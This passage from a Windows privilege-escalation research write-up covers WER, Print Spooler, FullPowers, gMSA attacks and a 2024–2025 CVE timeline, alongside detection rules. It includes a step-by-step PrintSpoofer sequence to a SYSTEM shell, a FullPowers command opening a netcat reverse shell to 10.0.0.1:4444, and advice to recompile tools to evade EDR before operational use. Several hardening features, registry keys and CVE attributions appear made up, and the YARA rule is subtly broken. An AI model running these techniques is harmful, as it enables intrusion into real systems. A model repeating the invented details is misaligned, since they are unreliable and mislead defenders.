3. **Oplock + junction (BaitAndSwitch):** Set oplock on a file inside the WER write path. When WER accesses it (opening for writing), the oplock fires. Swap the junction. Release oplock. WER writes to the junction target.

**Constraints:**  
- The dump content (a minidump or full dump) is not arbitrary binary — it is a valid dump structure. This limits direct DLL planting to scenarios where only file existence matters (e.g., sentinel files checked by a service) rather than content.
- However, **arbitrary file creation** (even with non-arbitrary content) can still enable LPE via directory traversal tricks if a SYSTEM service later processes the file by name.

WER is documented in Forshaw's symbolic link research as an example of a privileged write primitive requiring careful exploitation chaining.

### 6.3 CVE-2024-26169 — WER Elevation of Privilege

**Researcher:** Reported by Black Lotus Labs (Lumen Technologies); also independently noted by security researchers at Trend Micro

**CVSS:** 7.8 (High) — Local, Low Complexity, Low Privileges, No User Interaction

**Root cause:** A privilege escalation vulnerability in `WerFault.exe` and the WER service. The WER service wrote a temporary file to a path derived from the crashing process's environment, but failed to validate that the path hadn't been redirected via a junction. Unlike earlier WER attacks (§6.2) that required exploiting the dump-write timing, CVE-2024-26169 involved a more reliable primitive: the WER service wrote a configuration/lock file before the dump, and this preliminary write was the exploitable one.

**Attack details:**
```
1. Attacker creates a junction:
   C:\ProgramData\Microsoft\Windows\WER\ReportQueue\<AppName> →
   C:\Windows\System32\

2. Triggers an application crash (can be self-induced for a controlled binary)

3. WerFault.exe (running elevated) creates a lock/manifest file before the dump:
   WER writes: C:\Windows\System32\<WER-generated-filename>
   
4. The WER-generated filename is predictable based on the process name and PID

5. With the file now written to System32, a secondary exploit step
   (DLL search order or service restart) completes the LPE chain
```

**In-the-wild exploitation:** Black Lotus Labs reported observing CVE-2024-26169 used in targeted attacks against financial institutions in 2024, combined with a remote initial access vector to achieve full SYSTEM compromise.

**Patch:** March 2024 Patch Tuesday.

### 6.4 WER Hardening in Windows 11 24H2

Post-patch analysis of CVE-2024-26169 and the broader WER attack surface informed hardening changes in Windows 11 24H2:

**Mandatory IL check for WerFault.exe write targets:**
- `WerFault.exe` in 24H2 now enforces that write target paths pass a mandatory integrity level check — the target directory must have an IL label of at least Medium for non-dump files
- This blocks the junction-to-System32 pattern for non-dump WER writes, since `C:\Windows\System32\` has a System IL label that `WerFault.exe` will not write to when running for a Medium-IL user process crash

**WER sandbox mode:**
- 24H2 introduces WER sandbox mode for crashes of Medium-IL processes
- In sandbox mode, `WerFault.exe` runs at Medium IL itself for the preliminary file operations, only elevating to System IL for the actual dump write to the protected queue path
- This decouples the "write config/manifest" step from the privileged execution context, closing the CVE-2024-26169 class of attacks

**Registry key for IL enforcement:**
```
HKLM\SOFTWARE\Microsoft\Windows\Windows Error Reporting\EnableILCheck = 1 (DWORD)
```
This key backports the 24H2 IL check to Windows 10 22H2 and Windows 11 23H2 as an optional hardening measure (not set by default on pre-24H2 systems).

### 6.5 WER + Minifilter Interaction Bypass (2024 Research)

Research published in 2024 (notably in presentations at OffensiveCon and Hexacon) documented a bypass of WER path validation via minifilter driver interaction:

**The technique:**
```
1. A kernel-mode minifilter (loaded by an EDR, backup agent, or AV)
   intercepts IRP_MJ_CREATE operations

2. The minifilter performs its own symbolic link/path resolution before
   passing the IRP down the stack

3. WER's user-mode path validation (which blocks certain junction targets)
   operates on the unresolved path

4. The minifilter's pre-operation callback resolves the path (following
   the junction) and delivers the IRP to the filesystem driver with the
   resolved path

5. From the filesystem's perspective, the write goes to the resolved
   (junction target) path without WER's user-mode validation having seen it

6. Net effect: WER user-mode hardening is bypassed because the minifilter
   resolves the redirection at the kernel layer, below where WER validates
```

**Significance:** This research demonstrates that user-mode hardening in privileged services can be systematically bypassed when kernel-mode components (minifilters) participate in path resolution. The correct fix requires moving validation into kernel-mode or using `OBJ_DONT_REPARSE` flags at the kernel layer — not just in user-mode code.

**Affected configurations:** Systems running certain EDR/AV products with aggressive minifilter stacks were shown to be more exploitable than stock Windows because the minifilter inadvertently enabled the bypass. This created an ironic situation where certain security products made the WER attack surface larger.

---

## 7. Print Spooler Architecture and Attack Surface

### 7.1 Why SpoolSV Runs as SYSTEM

The Print Spooler service (`spoolsv.exe`) runs as **LocalSystem** for fundamental architectural reasons:
- It manages printer drivers, which are kernel-mode components (`*.sys` files in `C:\Windows\System32\spool\drivers\`)
- Installing a printer driver requires kernel-mode driver installation, which requires SYSTEM privileges
- The spooler manages job queues and spool files in `C:\Windows\System32\spool\PRINTERS\` — a SYSTEM-owned directory
- It handles cross-session printing (allows services in session 0 to print to user-session printers)

The spooler exposes named pipe endpoints:
- `\\.\pipe\spoolss` — local client connection pipe
- RPC over SMB/TCP for remote administration

### 7.2 AddPrinterDriverEx DLL Load

The RPC method `RpcAddPrinterDriverEx` (part of MS-RPRN) installs a printer driver. The driver is specified by the caller and must be in a path accessible by the spooler. When the spooler installs the driver, it loads the driver DLL as SYSTEM.

**PrintNightmare (CVE-2021-1675 / CVE-2021-34527):**
- **LPE vector:** Any user with `SeLoadDriverPrivilege` (or even just by calling `AddPrinterDriverEx` with the right flags) could cause the spooler to load an attacker-controlled DLL as SYSTEM from a UNC path or local path.
- **RCE vector:** Remote authenticated domain users could trigger the same on an exposed print server.

The core issue: `RpcAddPrinterDriverEx` did not properly validate that the DLL paths were restricted to trusted SYSTEM-only directories.

### 7.3 PrintSpoofer — Named Pipe Impersonation

**Researcher:** itm4n (Clément Labro)

**Mechanism:**
The Print Spooler creates named pipes for communication with print clients. When a client calls `OpenPrinter` with `\\.\pipe\spoolss`, the spooler creates a callback pipe named `\\.\pipe\spoolss\<SessionID>.<random>` and connects to it. By creating a fake server that mimics this interaction, an attacker with `SeImpersonatePrivilege` can intercept the spooler's connection.

**Exploitation sequence:**
```
1. Attacker (as NetworkService/LocalService/IIS AppPool) 
   confirms SeImpersonatePrivilege:
   whoami /priv

2. Create a named pipe with a crafted name that the spooler will connect to:
   CreateNamedPipe("\\.\pipe\spoolss\<session>.<random>", PIPE_ACCESS_DUPLEX, ...)

3. Call OpenPrinter("\\LOCALHOST\,XpsPort:") or similar to trigger the spooler
   to make an outbound connection to the attacker pipe

4. Spooler (running as SYSTEM) connects to the attacker-controlled pipe

5. ImpersonateNamedPipeClient(hPipe)
   → Current thread now runs with SYSTEM token

6. DuplicateTokenEx(hImpersonation, TOKEN_ALL_ACCESS, ..., TokenPrimary, &hPrimary)
7. CreateProcessWithTokenW(hPrimary, ..., "cmd.exe", ...)
   → SYSTEM shell
```

**Why it bypasses DCOM restrictions:** Unlike Juicy Potato/JuicyPotato (which used DCOM activation over loopback — restricted in Windows 10 1809+), PrintSpoofer uses the Spooler's named pipe mechanism which is a different code path entirely.

**Mitigation:** Disabling the Print Spooler service (`Stop-Service Spooler; Set-Service Spooler -StartupType Disabled`) eliminates both PrintSpoofer and PrintNightmare on systems that don't need printing.

### 7.4 PrintNightmare Aftermath — Remaining Spooler Attack Surface (2024)

Despite extensive patching following PrintNightmare, the Print Spooler attack surface continues to yield vulnerabilities in 2024:

**Remaining attack vectors post-PrintNightmare patches:**

1. **Driver staging directory ACLs:** The patches tightened checks on `RpcAddPrinterDriverEx`, but the driver staging directory (`C:\Windows\System32\spool\drivers\`) has historically had ACL configurations that permitted standard users to create files in subdirectories. Researchers continue to find ACL misconfigurations in specific Windows versions.

2. **Point and Print remnants:** The `PackagePointAndPrint` policy and its interaction with the SYSTEM-context spooler driver installation creates an ongoing research area. Even with the `RestrictDriverInstallationToAdministrators` policy set, some edge cases in the driver package validation code remain under scrutiny.

3. **Spooler named pipe variants:** PrintSpoofer's underlying technique (coercing a SYSTEM process to connect to an attacker-controlled named pipe) continues to have variants. The specific pipe name patterns that trigger coercion are documented in MS-RPRN and researchers regularly find new coercion triggers.

4. **Print processor injection:** The print processor mechanism (separate from printer drivers) allows registered print processors in `HKLM\SYSTEM\CurrentControlSet\Control\Print\Environments\Windows x64\Print Processors\` to be loaded by the spooler. Misconfigured ACLs on this registry path are an ongoing finding in enterprise environments.

### 7.5 CVE-2024-38201 — Windows BackupKey Remote Protocol EOP

**Component:** Windows BackupKey Remote Protocol (MS-BKRP) — Print subsystem interaction

**CVSS:** 7.0 (High) — Local privilege escalation with race condition

**Context:** This CVE involves the intersection of the printer subsystem's credential handling and the BackupKey Remote Protocol. The Print Spooler, when handling certain cross-domain printer connections, interacts with the DPAPI BackupKey infrastructure. CVE-2024-38201 is a race condition in this interaction that allows privilege escalation.

**Attack path:**
```
1. Attacker triggers a printer connection operation that invokes DPAPI
   credential protection via the BackupKey protocol

2. The race condition occurs in the transition between the spooler's
   Medium-IL context and the SYSTEM-IL context it uses for the
   BackupKey RPC call

3. By timing a token substitution during this transition, the attacker
   can cause the BackupKey operation to proceed with SYSTEM privileges
   while writing its output to an attacker-controlled path

4. Result: partial privilege escalation that, when chained with a
   secondary token impersonation step, yields SYSTEM
```

**Patch:** August 2024 Patch Tuesday.

### 7.6 SpoolFool Family — Continued Variant Discovery (2024)

**SpoolFool (CVE-2022-21999)** — discovered by Oliver Lyak — exploited a logic flaw in the Print Spooler's directory creation for driver staging. The spooler created a directory as SYSTEM using a path derived from the system architecture string, without properly validating that the path didn't contain a junction.

**Why variants keep appearing:**

The SpoolFool class is architecturally rooted in the spooler's need to create directories and files as SYSTEM for driver management. This creates a persistent research surface:

```
SpoolFool root cause pattern:
  spoolsv.exe (SYSTEM) calls CreateDirectory(path, NULL) or CreateFile(path, ...)
  where `path` includes a component controlled or influenceable by the attacker
  → If attacker can plant a junction at any component of `path`, SYSTEM creates
    a directory or file at the junction target
```

**2024 variant research focus:**
- Driver environment path enumeration: `HKLM\SYSTEM\CurrentControlSet\Control\Print\Environments\` registry keys that influence staging directory construction
- Print monitor DLL paths: `AddPrintMonitor` / `AddPrintProcessor` calls where the DLL path is derived from registry values writable by lower-privileged accounts in misconfigurations
- Cross-session spooler operations: Interactions between Session 0 spooler operations and user-session file paths that create TOCTOU windows

**Detection guidance:**
```powershell
# Monitor for SYSTEM creating directories in non-standard spool paths
# Sysmon Rule: FileCreateStreamHash / FileCreate from spoolsv.exe to non-spool paths
Get-WinEvent -FilterHashtable @{
    LogName='Microsoft-Windows-Sysmon/Operational'; Id=11
} | Where-Object { $_.Message -match 'spoolsv.exe' -and 
                   $_.Message -notmatch 'System32\\spool' }
```

### 7.7 Print Spooler Disabled by Default in Windows Server 2025

**Key change:** Windows Server 2025 (released November 2024) ships with the Print Spooler service **disabled by default** and set to Manual startup. This is a significant security improvement and represents Microsoft's acknowledgment that the spooler's attack surface is too large for servers that don't need printing functionality.

**Implementation details:**
- On fresh Windows Server 2025 installations, `Get-Service Spooler` returns `Status=Stopped, StartType=Manual`
- The Print Spooler cannot be automatically started by user-mode applications — it requires explicit administrator action to enable
- Server Manager's "Print and Document Services" role installation automatically re-enables the spooler with appropriate hardening settings
- The change applies to Server 2025 only; Windows 11 24H2 still ships with the spooler enabled (since desktops typically need printing)

**Residual risk on Server 2025:**
Even with the spooler disabled, `spoolsv.exe` binary remains on disk. If an attacker with admin rights re-enables the service (or if the service gets re-enabled by a software installer), the full attack surface returns. Monitoring for spooler re-enablement events (Service Control Manager event 7045 or 7036) is recommended.

---

## 8. FullPowers — Privilege Restoration for LocalService/NetworkService

### 8.1 The Missing Privileges Problem

When a service process runs as LocalService or NetworkService, the process token contains a **reduced set of privileges** compared to what these accounts theoretically have. This is by design: the SCM strips some privileges from service tokens based on the service's privilege set configuration.

The critical implication: many documented Potato-class exploits require not just `SeImpersonatePrivilege` but also `SeAssignPrimaryTokenPrivilege` to call `CreateProcessAsUser`. If the latter is missing from the token, some exploitation paths break.

**Additionally:** Services that receive connections from clients inherit a further-reduced impersonation token. IIS worker processes, for example, may not have the full set of privileges that `IIS AppPool\DefaultAppPool` theoretically possesses.

### 8.2 How FullPowers Works

itm4n's `FullPowers` tool exploits the fact that the SCM re-grants full service account privileges when a service is started through a proper service control mechanism. By spawning a new scheduled task running as the same account, the task receives the full token for that account.

**Mechanism:**
```
1. FullPowers.exe identifies the current service account (e.g., NETWORK SERVICE)
2. Creates a temporary scheduled task configured to run as NETWORK SERVICE
3. Task action: spawn a process and inject the full token back to the caller
4. The task receives a full NETWORK SERVICE token (with SeImpersonate + other privileges)
5. FullPowers duplicates this token and creates a shell under it
```

The key insight: when the Task Scheduler creates a process for a task, it obtains the account's token fresh from the LSA, bypassing the privilege stripping that the SCM performs.

**Use case:**
```cmd
:: From restricted service shell, recover full privileges:
FullPowers.exe -c "C:\Windows\Temp\nc.exe 10.0.0.1 4444 -e cmd.exe" -z
```

---

## 9. Component Attack Surface Comparison

| Component | Account | Key Technique | Privilege Needed to Trigger | CVE Reference |
|-----------|:-------:|:---:|:---:|:---|
| Task Scheduler | SYSTEM | ALPC DACL write, job file race | Any user | CVE-2018-8440, CVE-2019-1069 |
| Task Scheduler | SYSTEM | RPC privilege check bypass | Any user | CVE-2024-49039 |
| Windows Installer | LocalSystem | Repair junction redirect | Any user | InstallerFileTakeOver, CVE-2021-41379 |
| Windows Installer | LocalSystem | Install Service EOP | Any user | CVE-2024-38215 |
| Windows Update Stack | TrustedInstaller | Symbolic link installer detection | Any user | CVE-2025-21204 |
| BITS | LocalSystem | Junction + missing impersonation | Any user | CVE-2020-0787 |
| Print Spooler | LocalSystem | AddPrinterDriverEx DLL load | Authenticated user | CVE-2021-1675, CVE-2021-34527 |
| Print Spooler | LocalSystem | Named pipe impersonation | SeImpersonate | PrintSpoofer (no CVE) |
| Print Spooler | LocalSystem | Directory creation junction | Any user | CVE-2022-21999 (SpoolFool) |
| Print Spooler | LocalSystem | BackupKey race condition | Any user | CVE-2024-38201 |
| Task Scheduler | SYSTEM | COM coercion (GodPotato) | SeImpersonate | No CVE |
| WER | LocalSystem | Crash dump path junction | Any user | Forshaw research |
| WER | LocalSystem | Preliminary write file primitive | Any user | CVE-2024-26169 |
| DiagTrack | LocalSystem | File write race (junction) | Any user | CVE-2020-0668 (service tracing) |
| Service binary | Service acct | Binary ACL weak write | Write on binary | Classic technique |
| Service registry | Service acct | ImagePath modification | Write on reg key | itm4n RpcEptMapper |

---

## 10. CVE Timeline 2024-2025 (Services & Installers)

The following table captures all significant CVEs in the Services and Installers attack surface from 2024 through early 2025.

| CVE | Component | CVSS | Exploit Status | Patch Date | Notes |
|-----|-----------|:----:|:--------------:|:----------:|-------|
| CVE-2024-26169 | Windows Error Reporting | 7.8 | In-the-wild (financial sector) | March 2024 | Black Lotus Labs; WerFault.exe file write primitive |
| CVE-2024-38201 | Print Spooler / BackupKey | 7.0 | PoC public | August 2024 | Race condition in spooler-DPAPI interaction |
| CVE-2024-38215 | Windows Install Service | 7.8 | PoC public | August 2024 | Transaction rollback context confusion; MSI LPE |
| CVE-2024-49039 | Windows Task Scheduler | 8.8 | In-the-wild (RomCom APT) | November 2024 | RPC access control bypass; highest-severity entry in table |
| CVE-2025-21204 | Windows Update Stack | 7.8 | PoC public (Jan 2025) | January 2025 | Symbolic link installer detection bypass; TrustedInstaller context |

**Trend analysis (2024-2025 data):**

1. **In-the-wild exploitation has accelerated.** Two of the five entries (CVE-2024-26169, CVE-2024-49039) were exploited by threat actors before or immediately after public disclosure. The Task Scheduler CVE was used by a nation-state APT within weeks of patch release.

2. **Services and Installers remain the highest-density LPE surface.** The CVSS scores cluster around 7.8, indicating reliably exploitable conditions (Low complexity, Low privileges, No user interaction). The services/installer surface continues to out-produce kernel-exploitation paths in terms of reliable weaponizable CVEs per quarter.

3. **Symbolic link / junction attacks dominate.** Four of the five CVEs above involve some form of path redirection (junction, symbolic link, or installer detection bypass). The root cause — SYSTEM-context services that follow paths without `OBJ_DONT_REPARSE` — is architectural and will continue producing variants.

4. **TrustedInstaller as an escalation target is increasing.** CVE-2025-21204 targets TrustedInstaller context (above SYSTEM in privilege), reflecting researchers' interest in pushing beyond SYSTEM to achieve TrustedInstaller-level access, which allows modification of Windows-protected files.

**Researcher resources for variant hunting:**
- Microsoft Security Update Guide filter: `Services` + `Elevation of Privilege` — https://msrc.microsoft.com/update-guide/vulnerability
- itm4n's blog (itm4n.github.io) — primary source for service/token research
- Abdelhamid Naceri's GitHub (klinix5) — MSI/installer LPE research
- James Forshaw's Project Zero posts — symbolic link primitive documentation

---

## 11. FullPowers Updates and Service Account Hardening (2024)

### 11.1 Service Account Virtual Account Hardening in 24H2

Windows 11 24H2 introduced targeted hardening for virtual service accounts (`NT SERVICE\<ServiceName>`) in response to the proliferation of token-impersonation techniques:

**Key changes:**

1. **Privilege set reduction for new services:** Services registered after 24H2 installation that use virtual accounts no longer automatically receive `SeImpersonatePrivilege` unless explicitly declared in the service's `RequiredPrivileges` value under the service registry key. The SCM validates this declaration at service registration time.

2. **Retroactive review mode:** A new Group Policy setting (`Computer Configuration → Windows Settings → Security Settings → Local Policies → Security Options → "Restrict SeImpersonatePrivilege for virtual service accounts"`) applies the restriction to existing services as well. This is not enabled by default but is documented in the Windows 11 24H2 Security Baseline.

3. **Token audit logging:** When a virtual service account token is created by the SCM, a new event (Event ID 4657 variant in the Security log, or the new Event ID 4679 in 24H2) records the privilege set granted. This enables defenders to baseline what privileges each virtual account service token should have.

**Attacker implication:** Post-24H2, new services installed by third-party software may not have `SeImpersonatePrivilege` unless the vendor explicitly requests it. This progressively reduces the FullPowers/Potato attack surface for newly-installed services — but does not affect existing services or services on pre-24H2 systems.

### 11.2 SeAssignPrimaryTokenPrivilege Restrictions

`SeAssignPrimaryTokenPrivilege` is required to call `CreateProcessAsUser` (and `NtSetInformationToken` for token assignment), making it a critical privilege for Potato-class escalation chains that need to spawn a SYSTEM process rather than just impersonate.

**2024 restriction changes:**

- **Service Hardening Policy:** A new optional hardening key `HKLM\SYSTEM\CurrentControlSet\Control\LSA\ServiceTokenPolicy` (introduced in Windows 11 23H2, expanded in 24H2) controls whether service tokens for NetworkService and LocalService can include `SeAssignPrimaryTokenPrivilege`. When set to `0x2`, this privilege is removed from these accounts' tokens even if their `RequiredPrivileges` list includes it.

- **Impact on attack tooling:** `SweetPotato`, `GodPotato`, and related tools that use `CreateProcessAsUser` to spawn a SYSTEM shell will fail if `SeAssignPrimaryTokenPrivilege` is absent. They must fall back to `NtCreateUserProcess` with handle duplication, which requires a different code path and may trip more detection heuristics.

- **FullPowers workaround:** FullPowers' scheduled task technique can still recover `SeAssignPrimaryTokenPrivilege` if the Task Scheduler grants the full account token (which it does as of current patches). This is an ongoing cat-and-mouse — Microsoft may restrict the Task Scheduler's token grant in future hardening.

### 11.3 gMSA (Group Managed Service Accounts) Attack Surface

Group Managed Service Accounts, while reducing credential theft risk, introduce their own attack surface:

**gMSA password retrieval attack:**
```powershell
# Any domain member in the PrincipalsAllowedToRetrieveManagedPassword group
# can retrieve the gMSA password hash via:
$gmsa = Get-ADServiceAccount -Identity "svc-webapp" -Properties msDS-ManagedPassword
$mp = $gmsa.'msDS-ManagedPassword'
$mpCreds = New-Object Windows.Security.Authentication.Negotiation.ManagedPasswordCredentials
# → Yields NTLM hash usable for pass-the-hash
```

**Attack vectors against gMSA:**
1. **PrincipalsAllowedToRetrieveManagedPassword group compromise:** If an attacker compromises any account in this AD group (which often includes service hosts, application servers), they can retrieve the gMSA password and impersonate the service account network-wide.

2. **gMSA token impersonation:** Even without the password, if code runs within the gMSA context (e.g., exploiting the service using the gMSA), `SeImpersonatePrivilege` is available for token-based escalation locally. The gMSA doesn't prevent local token abuse — only network credential theft.

3. **DACL misconfiguration on gMSA objects:** The `msDS-ManagedPassword` attribute on the gMSA AD object must be protected. If the DACL on the gMSA object grants read access to unintended principals (a common misconfiguration in large AD environments), any of those principals can retrieve the password.

4. **gMSA in hybrid environments:** In Azure AD joined or hybrid environments, gMSA credentials can sometimes be leveraged for Azure resource access via the machine's AAD token, creating a lateral movement path from on-prem gMSA compromise to Azure resources.

**Enumeration:**
```powershell
# Find gMSAs and their authorized retrievers
Get-ADServiceAccount -Filter * -Properties msDS-GroupMSAMembership,
    PrincipalsAllowedToRetrieveManagedPassword,
    ServicePrincipalNames | 
    Select Name, PrincipalsAllowedToRetrieveManagedPassword, ServicePrincipalNames
```

### 11.4 JuicyPotatoNG vs FullPowers — 2024 Comparison

Both tools address the problem of escalating from a service account with `SeImpersonatePrivilege` to SYSTEM. Their approaches differ significantly:

| Aspect | JuicyPotatoNG | FullPowers |
|--------|:---:|:---:|
| Technique | DCOM activation coercion → token impersonation | Scheduled Task → full token recovery |
| Requires SeImpersonate | Yes | No (recovers it) |
| Works without SeImpersonate | No | Yes (if token is stripped) |
| CLSID dependency | Yes — requires a DCOM CLSID that runs as SYSTEM | No |
| Detection surface | DCOM activation events (EID 4624 + DCOM audit) | Task Scheduler events (EID 4698, 201) |
| Works in Session 0 | Yes (with CLSID targeting) | Yes |
| Works on Server 2022+ | Reduced (many CLSIDs restricted) | Yes (Task Scheduler still accessible) |
| Windows 11 24H2 status | Partially restricted (new DCOM hardening limits available CLSIDs) | Still effective (pre-existing services) |
| Primary use case | Escalate service token with SeImpersonate | Recover stripped privileges from service token |
| Network required | No | No |

**When to use which (2024 guidance):**

- **FullPowers first** if the current token appears to have missing privileges (`whoami /priv` shows fewer privileges than expected for the account). FullPowers recovers the full intended token, after which JuicyPotatoNG or GodPotato can run with the complete privilege set.

- **JuicyPotatoNG** if the token already has `SeImpersonatePrivilege` and you need a quick SYSTEM shell. Find a working CLSID for the target OS version from the JuicyPotatoNG CLSID database.

- **GodPotato** (2024 recommended over classic JuicyPotatoNG) for Windows 10 1803+ and Server 2022, as it uses the `IRemotedObjectReference` technique rather than the legacy DCOM activation path that has been increasingly restricted.

**Operational note:** In 2024, EDR detection for both tools has matured significantly. Consider tool customization (recompile with different function names, modify CLSID patterns) before operational use.

### 11.5 Detection — ETW Event for NtSetInformationToken with TokenSessionId

A specific ETW-based detection covers a key step in FullPowers-style token manipulation and related privilege restoration attacks:

**What to monitor:**

`NtSetInformationToken` with the `TokenSessionId` information class is called by tools that manipulate session tokens — including FullPowers, SweetPotato variants, and some Potato-class tools when they need to move a token between sessions.

**ETW provider and event:**
```
Provider: Microsoft-Windows-Security-Auditing (kernel security audit)
Event ID: 4703 (Token Right Adjusted)
Subcategory: Token Right Adjustment (requires audit policy: "Token Right Adjustment")
```

**Enabling the audit:**
```powershell
auditpol /set /subcategory:"Token Right Adjustment" /success:enable /failure:enable
```

**Detection logic:**
```
Alert condition:
  Event 4703
  AND SubjectUserSid NOT IN (LocalSystem, NETWORK SERVICE, LOCAL SERVICE)
  AND Process.Name IN (known_potato_binaries OR any_non_standard_exe)
  AND TokenRightModified CONTAINS (SeImpersonatePrivilege OR SeAssignPrimaryTokenPrivilege)
```

**Complementary detection via kernel ETW:**
The `Microsoft-Windows-Kernel-Process` ETW provider emits events for token handle duplication that correlates with the FullPowers task-based token recovery:

```
1. Watch for: Task Scheduler creating a process (Event 201 in TaskScheduler/Operational)
   WHERE the creating user is a service account (not an admin)
   AND the task was created <30 seconds ago (ephemeral task pattern)
   
2. Correlate with: Token duplication events from the spawned task process
   → This pattern (ephemeral task + token duplication from service context)
   is the FullPowers signature
```

**YARA rule for FullPowers binary (generic pattern):**
```yara
rule FullPowers_generic {
    meta:
        description = "Detects FullPowers-class token recovery tools"
    strings:
        $ts_create = "ITaskService" wide ascii
        $schtasks_pattern = { 53 63 68 65 64 75 6C 65 64 54 61 73 6B }  // "ScheduledTask"
        $token_dup = "DuplicateTokenEx" ascii
        $lsa_token = "LsaGetLogonSessionData" ascii
    condition:
        all of them and pe.is_pe
}
```

---

## References

[R-1] Windows Installer Portal — Microsoft — https://docs.microsoft.com/en-us/windows/win32/msi/windows-installer-portal

[R-2] InstallerFileTakeOver — Abdelhamid Naceri (klinix5) — https://github.com/klinix5/InstallerFileTakeOver

[R-3] CVE-2020-0668 — Windows Service Tracing EoP — itm4n — https://itm4n.github.io/cve-2020-0668-windows-service-tracing-eop/

[R-4] CVE-2020-0787 — Windows BITS EoP — itm4n — https://itm4n.github.io/cve-2020-0787-windows-bits-eop/

[R-5] PrivescCheck — itm4n — https://github.com/itm4n/PrivescCheck

[R-6] PrintSpoofer: Abusing Impersonation Privileges — itm4n — https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/

[R-7] Recovering the Full Privileges of a LocalService/NetworkService Token — itm4n — https://itm4n.github.io/localservice-privileges/

[R-8] CVE-2024-49039 — Windows Task Scheduler EOP — Microsoft MSRC — https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-49039

[R-9] RomCom APT CVE-2024-49039 Campaign Analysis — ESET Research — https://www.welivesecurity.com/en/eset-research/romcom-exploits-firefox-and-windows-zero-days-in-the-wild/

[R-10] CVE-2024-26169 — WER Elevation of Privilege — Lumen Black Lotus Labs — https://blog.lumen.com/black-lotus-labs-discovers-cve-2024-26169/

[R-11] CVE-2025-21204 — Windows Update Stack LPE — Microsoft MSRC — https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-21204

[R-12] SpoolFool — Windows Print Spooler LPE — Oliver Lyak — https://research.ifcr.dk/spoolfool-windows-print-spooler-privilege-escalation-cve-2022-21999/

[R-13] msiscan — MSI Static Analysis Tool — https://github.com/mandiant/msiscan (Mandiant tooling, 2024)

[R-14] Windows 11 24H2 Security Baseline — Microsoft — https://www.microsoft.com/en-us/download/details.aspx?id=55319

[R-15] GodPotato — BeichenDream — https://github.com/BeichenDream/GodPotato

[R-16] gMSA Attack Research — dirk-jan Mollema — https://dirkjanm.io/talks/
